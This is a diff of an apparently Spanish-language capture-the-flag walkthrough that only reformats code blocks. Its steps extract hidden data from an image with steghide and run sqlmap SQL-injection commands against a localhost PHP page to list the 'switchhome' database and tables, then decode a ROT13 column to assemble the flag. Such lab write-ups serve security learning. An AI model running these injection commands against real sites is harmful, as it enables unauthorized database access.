@@ -31,7 +31,9 @@ Debemos descargar la foto que tendria los datos de una tarjeta de credito
 
 Al descargarla usamos el comando:
 
-```steghide extract -sf card.jpg```
+```
+steghide extract -sf card.jpg
+```
 
 ACLARACION
 - card.jpg es el nombre que le puse, si lo cambian, cambiendolo en el comando
@@ -53,18 +55,26 @@ Nos logueamos como admin
 Accedemos al listado de hospedajes 
 Seleccionamos el la opcion "Ver detalles" y obtememos la url
 Utilizamos sqlmap para obtener las tablas con el comando
-```sqlmap -u "http://localhost/detalle-hospedaje.php?var=34" --dbs```
+```
+sqlmap -u "http://localhost/detalle-hospedaje.php?var=34" --dbs
+```
 
 Con eso buscaremos las tablas 
-```sqlmap -u "http://localhost/detalle-hospedaje.php?var=34" -D switchhome --tables```
+```
+sqlmap -u "http://localhost/detalle-hospedaje.php?var=34" -D switchhome --tables
+```
 
 Y luego debemos obtener
 
 -La columna dsa_ROT13 de la tabla notificacion
 
-```Su contenido debe der decodificado en ROT13, como lo indica el nombre de la columna```
+```
+Su contenido debe der decodificado en ROT13, como lo indica el nombre de la columna
+```
 
 
 
 LA FLAG ENTERA:
-```Primera Parte + Segunda Parte + Tercera Parte```
+```
+Primera Parte + Segunda Parte + Tercera Parte
+```
